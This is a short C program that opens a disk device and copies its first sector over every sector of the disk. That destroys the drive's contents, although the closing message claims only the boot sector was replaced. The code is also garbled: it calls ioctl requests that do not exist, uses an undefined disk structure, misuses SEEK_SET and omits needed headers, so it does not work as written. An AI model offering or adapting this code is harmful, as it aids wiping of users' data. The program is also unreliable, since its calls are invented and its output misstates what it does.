#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

int main(int argc, char *argv[]) {
    if (argc!= 2) {
        printf("Usage: %s <device>\n", argv[0]);
        return 1;
    }

    char *device = argv[1];
    int fd = open(device, O_RDWR);
    if (fd < 0) {
        perror("Could not open device");
        return 1;
    }

    struct disk_info disk_info;
    if (ioctl(fd, GET_INFO, &disk_info) < 0) {
        perror("Could not get disk information");
        return 1;
    }

    if (disk_info.disk_type!= DISK_TYPE_FIXED || disk_info.removable == 1) {
        printf("Sorry, this program only works on fixed disks.\n");
        return 1;
    }

    if (ioctl(fd, SEEK_SET, 0) < 0 || ioctl(fd, READ_FULL, &disk_info) < 0) {
        perror("Could not read boot sector");
        return 1;
    }

    char *boot_sector = malloc(disk_info.sector_size);
    if (boot_sector == NULL) {
        perror("Could not allocate memory");
        return 1;
    }

    if (ioctl(fd, READ_FULL, boot_sector) < 0) {
        perror("Could not read boot sector");
        return 1;
    }

    for (int i = 0; i < disk_info.sector_count; i++) {
        if (ioctl(fd, SEEK_SET, i * disk_info.sector_size) < 0 || ioctl(fd, WRITE_FULL, boot_sector) < 0) {
            perror("Could not write to boot sector");
            return 1;
        }
    }

    printf("Boot sector replaced with an empty file.\n");
    return 0;
}
